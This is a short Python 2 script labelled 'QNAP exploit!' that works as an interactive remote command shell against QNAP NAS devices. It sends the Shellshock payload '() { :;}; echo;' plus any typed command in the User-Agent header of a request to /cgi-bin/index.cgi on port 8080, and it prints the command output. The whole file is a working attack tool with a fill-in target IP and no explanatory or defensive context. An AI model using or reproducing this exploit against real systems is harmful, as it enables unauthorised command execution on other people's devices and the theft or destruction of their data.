#!/usr/bin/python
import socket


print "QNAP exploit!"
inputstr=""
ip="x.x.x.x" #Change IP Value
port=8080

while True:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	inputstr=raw_input("cmd> ")
	s.connect((ip,port))
	s.send("GET /cgi-bin/index.cgi HTTP/1.0\nHost: "+ip+"\nUser-Agent: () { :;}; echo; "+inputstr+"\r\n\r\n")
	output=""
	while True:
		buf=s.recv(4096)
		if not buf:
			break		
		output+=buf
	indexHTML= output.find("html")
	print output[0:indexHTML]
	s.close()	
